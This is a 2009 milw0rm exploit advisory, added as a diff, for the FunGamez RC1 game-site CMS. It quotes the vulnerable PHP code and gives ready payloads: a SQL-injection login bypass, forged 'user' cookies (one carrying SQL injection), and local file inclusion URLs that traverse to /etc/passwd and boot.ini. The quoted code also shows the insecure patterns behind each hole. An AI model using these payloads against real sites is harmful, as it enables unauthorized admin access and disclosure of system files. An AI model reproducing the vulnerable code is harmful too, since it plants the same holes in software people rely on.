@@ -1,0 +1,184 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	    	MULTIPLE REMOTE VULNERABILITIES		             	     |
+|--------------------------------------------------------------------------------------------|
+|                         	| FunGamez-release candidate 1 |		 	     |
+|  CMS INFORMATION:		 ------------------------------			             |
+|										             |
+|-->WEB: http://sourceforge.net/projects/fg-gsm/				             |
+|-->DOWNLOAD: http://sourceforge.net/projects/fg-gsm/ 	   		             	     |
+|-->DEMO: N/A										     |
+|-->CATEGORY: CMS / Portals								     |
+|-->DESCRIPTION: A game-site manager with fully customisable design, and easy game adding    |
+| 		and I will build in more options to make the site fully customisable...	     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3								     |
+|-->DORK: N/A										     |
+|-->CATEGORY: AUTH BYPASS/LFI							             |
+|-->AFFECT VERSION:RC-1						     			     |
+|-->Discovered Bug date: 2009-04-20							     |
+|-->Reported Bug date: 2009-04-20							     |
+|-->Fixed bug date: Not fixed								     |
+|-->Info patch: Not fixed							             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
+----------------------------------------------------------------------------------------------
+
+/////////////////////////////
+
+AUTH BYPASS (LOGIN FORM)
+
+/////////////////////////////
+
+-----------
+BUG FILES:
+-----------
+
+Path --> [HOME_PATH]/pages/login.php
+
+It contents:
+
+...
+
+	$logindat = mysql_query("SELECT * FROM `fg_users` WHERE `username` = '".$uname."' and `password` = '".$upass."'");
+
+...
+
+---------
+EXPLOIT:
+---------
+
+PEPE' OR 1=1 /*
+
+Password:ANY
+
+
+////////////////////////////////////////
+
+AUTH BYPASS (INSECURE COOKIE HANDLING)
+
+////////////////////////////////////////
+
+-----------
+BUG FILES:
+-----------
+
+Path --> [HOME_PATH]/includes/user.php
+
+It contents:
+
+...
+
+function checklogin(){
+
+	If ( $_SESSION['user'] == null )  {
+
+		If ( $_COOKIE['user'] == null )   {          
+ 			return 0;       
+ 		}         
+		Else        
+		{           
+			return $_COOKIE['user'];         
+		}     
+	}  
+ 	Else      
+	{        
+	return $_SESSION['user'];      
+	}
+}
+
+...
+
+Path --> [HOME_PATH]/index.php
+
+It contents:
+
+...
+
+If ( $page->requireslogin($name) && !$user->checklogin() ) { $name = 'login'; $_GET['newlogin'] = 1; }
+
+...
+
+----------
+EXPLOITS:
+----------
+
+Add cookie:
+
+1)user=1 path=/	(Insecure cookie)
+
+2)user=pepe' or 1=1 /* path=/ (SQL injection)
+
+
+
+
+///////////////////////////////
+
+LOCAL FILE INCLUSION (LFI)
+
+///////////////////////////////
+
+------------
+CONDITIONS:
+------------
+
+Need: Be admin user (above! :P)
+
+-----------
+BUG FILES:
+-----------
+
+Path --> [HOME_PATH]/admin/load.php
+
+It contents:
+
+...
+
+If ( !isset($_GET['module']) ) $mod = 'start';
+
+If ( isset($_GET['module']) ) $mod = $_GET['module'];
+
+include('./admin/modules/'.$mod.'.php');
+
+----------
+EXPLOITS:
+----------
+
+1)http://[HOST]/FunGamez/index.php?admin&module=../../../../../../boot.ini%00
+
+2)http://[HOST]/FunGamez/index.php?admin&module=../../../../../etc/passwd%00
+
+
+*******************************************************************
+ ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
+*******************************************************************
+-------------------------------------------------------------------
+*******************************************************************
+ GREETZ TO: JosS and all spanish Hack3Rs community!
+*******************************************************************
+
+-------------------EOF---------------------------------->>>ENJOY IT!
+
+# milw0rm.com [2009-04-20]
